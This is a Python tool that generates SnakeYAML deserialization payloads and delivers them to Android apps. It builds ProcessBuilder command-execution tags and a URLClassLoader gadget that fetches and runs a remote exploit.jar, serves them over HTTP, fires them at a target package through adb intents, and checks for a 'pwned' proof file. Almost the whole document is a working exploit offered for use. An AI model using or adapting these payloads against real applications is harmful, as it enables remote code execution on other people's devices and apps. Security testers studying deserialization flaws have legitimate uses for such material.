#!/usr/bin/env python3
"""
SnakeYAML Deserialization RCE Payload Generator & Delivery

Generates SnakeYAML payloads for arbitrary class instantiation and delivers
them via HTTP server for intent-based exploitation.

Usage:
  # Generate payload only
  python3 yaml_rce_payload.py --class com.example.CommandUtil --args "touch /sdcard/pwned"

  # Generate and serve via HTTP
  python3 yaml_rce_payload.py --class com.example.CommandUtil --args "touch /sdcard/pwned" --serve --port 8080

  # Deliver via adb intent
  python3 yaml_rce_payload.py --class com.example.CommandUtil --args "touch /sdcard/pwned" \
    --deliver --package com.target.app --activity .MainActivity

Reference: yaml-deserialization-rce.md, deserialization-attacks.md
"""

import argparse
import http.server
import os
import subprocess
import sys
import tempfile
import threading
import time


def generate_payload(class_name: str, args: list, style: str = "sequence") -> str:
    """Generate SnakeYAML deserialization payload.

    Args:
        class_name: Fully qualified Java class name
        args: Constructor arguments
        style: 'sequence' for [arg1, arg2] or 'mapping' for property: value
    """
    if style == "sequence":
        # Single-argument constructor (most common)
        if len(args) == 1:
            return f'!!{class_name} ["{args[0]}"]'
        else:
            args_str = ", ".join(f'"{a}"' for a in args)
            return f'!!{class_name} [{args_str}]'
    elif style == "mapping":
        lines = [f"!!{class_name}"]
        for i, arg in enumerate(args):
            # Assume property names like prop0, prop1... (user should customize)
            lines.append(f"property{i}: {arg}")
        return "\n".join(lines)
    elif style == "processbuilder":
        # Special case: ProcessBuilder takes String array
        args_str = ", ".join(f'"{a}"' for a in args)
        return f'!!java.lang.ProcessBuilder [[{args_str}]]'
    else:
        raise ValueError(f"Unknown style: {style}")


def generate_common_payloads(class_name: str, command: str) -> dict:
    """Generate multiple payload variants for testing."""
    payloads = {}

    # Standard single-arg constructor
    payloads["constructor"] = f'!!{class_name} ["{command}"]'

    # ProcessBuilder (if class_name is java.lang.ProcessBuilder)
    parts = command.split()
    args_str = ", ".join(f'"{p}"' for p in parts)
    payloads["processbuilder"] = f'!!java.lang.ProcessBuilder [[{args_str}]]'

    # URL (SSRF test)
    payloads["url_ssrf"] = f'!!java.net.URL ["http://127.0.0.1:8888/ssrf-test"]'

    # ScriptEngineManager (classloader gadget)
    payloads["script_engine"] = (
        '!!javax.script.ScriptEngineManager '
        '[{!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:8888/exploit.jar"]]]}]'
    )

    return payloads


class YAMLPayloadHandler(http.server.BaseHTTPRequestHandler):
    """Serves YAML payload with correct MIME type."""

    payload_content = ""

    def do_GET(self):
        data = self.payload_content.encode('utf-8')
        self.send_response(200)
        self.send_header("Content-Type", "application/yaml")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, fmt, *args):
        print(f"[HIT] {self.client_address[0]} → {args[0] if args else '?'}")


def serve_payload(payload: str, port: int, host: str = "0.0.0.0"):
    """Start HTTP server to serve the YAML payload."""
    YAMLPayloadHandler.payload_content = payload
    server = http.server.HTTPServer((host, port), YAMLPayloadHandler)
    print(f"[*] Serving YAML payload on {host}:{port}")
    print(f"[*] Payload:\n{payload}\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()


def deliver_via_adb(payload: str, package: str, activity: str = ".MainActivity",
                    port: int = 8080, mime_type: str = "application/yaml"):
    """Deliver payload via adb reverse + intent."""

    # Write payload to temp file and serve
    with tempfile.NamedTemporaryFile(mode='w', suffix='.yml', delete=False) as f:
        f.write(payload)
        payload_file = f.name

    print(f"[*] Payload written to: {payload_file}")

    # Setup adb reverse
    print(f"[*] Setting up adb reverse tcp:{port} tcp:{port}")
    subprocess.run(['adb', 'reverse', f'tcp:{port}', f'tcp:{port}'],
                   capture_output=True)

    # Start server in background
    YAMLPayloadHandler.payload_content = payload
    server = http.server.HTTPServer(("0.0.0.0", port), YAMLPayloadHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] Server started on port {port}")

    time.sleep(0.5)

    # Trigger intent
    url = f"http://127.0.0.1:{port}/evil.yml"
    cmd = [
        'adb', 'shell', 'am', 'start',
        '-a', 'android.intent.action.VIEW',
        '-d', url,
        '-t', mime_type,
        f'{package}/{activity}'
    ]
    print(f"[*] Triggering: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(f"[*] Result: {result.stdout.strip()}")

    # Wait and check
    time.sleep(2)
    print("[*] Checking for RCE proof...")
    check = subprocess.run(
        ['adb', 'shell', 'ls', '-la', '/sdcard/Download/pwned'],
        capture_output=True, text=True
    )
    if check.returncode == 0:
        print(f"[!] RCE CONFIRMED: {check.stdout.strip()}")
    else:
        print("[-] No proof file found. Check logcat:")
        print('    adb logcat -d | grep -i "yaml\\|constructor\\|error" | tail -20')

    server.shutdown()
    os.unlink(payload_file)


def main():
    parser = argparse.ArgumentParser(
        description="SnakeYAML RCE payload generator and delivery tool")
    parser.add_argument('--class', dest='class_name', required=True,
                        help='Fully qualified gadget class name')
    parser.add_argument('--args', nargs='+', required=True,
                        help='Constructor arguments')
    parser.add_argument('--style', default='sequence',
                        choices=['sequence', 'mapping', 'processbuilder'],
                        help='Payload style (default: sequence)')
    parser.add_argument('--serve', action='store_true',
                        help='Start HTTP server to serve payload')
    parser.add_argument('--port', type=int, default=8080,
                        help='Server port (default: 8080)')
    parser.add_argument('--deliver', action='store_true',
                        help='Deliver via adb intent (requires --package)')
    parser.add_argument('--package', help='Target package name')
    parser.add_argument('--activity', default='.MainActivity',
                        help='Target activity (default: .MainActivity)')
    parser.add_argument('--all-variants', action='store_true',
                        help='Generate all payload variants')

    args = parser.parse_args()

    if args.all_variants:
        payloads = generate_common_payloads(args.class_name, args.args[0])
        print("[*] Generated payload variants:\n")
        for name, payload in payloads.items():
            print(f"  [{name}]")
            print(f"  {payload}\n")
        return

    payload = generate_payload(args.class_name, args.args, args.style)
    print(f"[*] Payload:\n{payload}\n")

    if args.deliver:
        if not args.package:
            parser.error("--deliver requires --package")
        deliver_via_adb(payload, args.package, args.activity, args.port)
    elif args.serve:
        serve_payload(payload, args.port)
    else:
        # Just print the payload
        print("[*] Use --serve to host via HTTP or --deliver to send via adb intent")


if __name__ == '__main__':
    main()
